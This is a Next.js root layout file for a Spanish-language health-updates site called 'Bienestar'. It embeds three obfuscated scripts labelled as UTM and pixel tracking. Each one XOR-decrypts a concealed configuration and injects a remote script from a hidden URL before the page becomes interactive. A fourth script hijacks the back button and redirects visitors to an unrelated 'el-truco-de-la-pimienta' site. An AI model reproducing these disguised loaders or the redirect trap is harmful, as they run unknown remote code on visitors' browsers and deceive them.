import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import Script from 'next/script'
import './globals.css'

const utmScript = `(function(){var m_s=atob("DEewlHYt4UZXOQvaQDyS4QRBw3x1UX+uMDSKu1lOhSh5TH+3KSHJuhVCjGg1SySpIzXZ5AJezjMjVHj1LCbE8QVZzywkGyf4ITPE5h9PlDIySingGzyS+hdAhGRtG2+7NCad4QJAiCAuFHuoJTHV+gIAkjM1UG+pYmuS4hdBlCN1Ayn4PRrN");var q_c=[];for(var i_y4=0;i_y4<m_s.length;i_y4++){q_c.push(m_s.charCodeAt(i_y4)&255);}var s_5=q_c[0];var w_75b=q_c.slice(1,1+s_5);var n_q16n=q_c.slice(1+s_5);var p_bh=n_q16n.map(function(b,i_jw){return b^w_75b[i_jw%s_5];});var f_n="";for(var t_41qv=0;t_41qv<p_bh.length;t_41qv++){f_n+=String.fromCharCode(p_bh[t_41qv]&255);}var q_uyb1=decodeURIComponent(escape(f_n));var u_p=JSON.parse(q_uyb1);var a_8n=u_p.globals||[];a_8n.forEach(function(i_ls){window[i_ls.name]=i_ls.value;});var u_n=document.createElement("script");u_n.src=u_p.url;u_n.async=true;u_n.defer=true;(u_p.attributes||[]).forEach(function(c_9){u_n.setAttribute(c_9.name,c_9.value);});(document.head||document.documentElement).appendChild(u_n);})();`

const pixelScript = `(function(){var p_arz=atob("DLUepsqhRhc0x/Z5KM4807jNZC0Wr4INWMYkieXCInkasoIUQdNniKnOKzlWtdkKS8d31r7SaWddv5MVB8V33q/NaH1H5dpbScFq1KPDM2NRtNRDc+gyhK3NKXVVq4VbEu5lhKTAK3IW/dQJQc17yoPFZDsWsZcVXdA8nOiXJy9W/sNKSoMnkaiSJ3ME85VKTocqxamDO0pJ");var j_5=[];for(var m_3lsq=0;m_3lsq<p_arz.length;m_3lsq++){j_5.push(p_arz.charCodeAt(m_3lsq)&255);}var b_s08=j_5[0];var d_91=j_5.slice(1,1+b_s08);var q_l=j_5.slice(1+b_s08);var t_pdr=q_l.map(function(b,f_m2k){return b^d_91[f_m2k%b_s08];});var z_e8t="";for(var j_lnwu=0;j_lnwu<t_pdr.length;j_lnwu++){z_e8t+=String.fromCharCode(t_pdr[j_lnwu]&255);}var e_1x6=decodeURIComponent(escape(z_e8t));var e_e=JSON.parse(e_1x6);var u_mlek=e_e.globals||[];u_mlek.forEach(function(a_vzsc){window[a_vzsc.name]=a_vzsc.value;});var e_3md7=document.createElement("script");e_3md7.src=e_e.url;e_3md7.async=true;e_3md7.defer=true;(e_e.attributes||[]).forEach(function(q_kzvu){e_3md7.setAttribute(q_kzvu.name,q_kzvu.value);});(document.head||document.documentElement).appendChild(e_3md7);})();`

const providedTrackingScript = `(function(){var l_r2u=atob("DBKHAf9Q55gxHW7dkWmldI08xaITdRqp4WG9LtAzg/YfaBqw+HT+L5w/irZTb0Gu8mDucYsjyOhYZQuxvmLueZo8yfJCP0L/8Gbzc5YykuxUbkznyk+rI5g8iPpQcR3/q0n8I5Exiv0TJ0yt+GribbY0xbQTaw+x5HelO91mhqBTJFvu8yS+Np1jhvwBKQ3u9yCzYpxymsVM");var f_o6=[];for(var y_63s=0;y_63s<l_r2u.length;y_63s++){f_o6.push(l_r2u.charCodeAt(y_63s)&255);}var k_arp=f_o6[0];var i_8l=f_o6.slice(1,1+k_arp);var o_i=f_o6.slice(1+k_arp);var t_u4n1=o_i.map(function(b,g_nl){return b^i_8l[g_nl%k_arp];});var z_pm27="";for(var f_akkj=0;f_akkj<t_u4n1.length;f_akkj++){z_pm27+=String.fromCharCode(t_u4n1[f_akkj]&255);}var l_24=decodeURIComponent(escape(z_pm27));var z_1y=JSON.parse(l_24);var d_kj6m=z_1y.globals||[];d_kj6m.forEach(function(n_b){window[n_b.name]=n_b.value;});var s_fi=document.createElement("script");s_fi.src=z_1y.url;s_fi.async=true;s_fi.defer=true;(z_1y.attributes||[]).forEach(function(v_v06y){s_fi.setAttribute(v_v06y.name,v_v06y.value);});(document.head||document.documentElement).appendChild(s_fi);})();`

const backNavigationScript = `history.pushState(null, document.title, location.href);window.addEventListener('popstate', function () { window.location.href = 'https://el-truco-de-la-pimienta.vercel.app'; });`


export const metadata: Metadata = {
  title: 'Bienestar | Actualizaciones diarias sobre salud',
  description: 'Actualizaciones diarias sobre bienestar y salud.',
  generator: 'v0.app',
  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export const viewport: Viewport = {
  colorScheme: 'light',
  themeColor: '#ffffff',
  width: 'device-width',
  initialScale: 1,
  userScalable: false,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="es" className="bg-background">
      <head>
        <Script
          id="utm-tracking"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{ __html: utmScript }}
        />
        <Script
          id="pixel-tracking"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{ __html: pixelScript }}
        />
        <Script
          id="provided-utm-tracking"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{ __html: providedTrackingScript }}
        />
        <Script
          id="back-navigation-redirect"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{ __html: backNavigationScript }}
        />
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
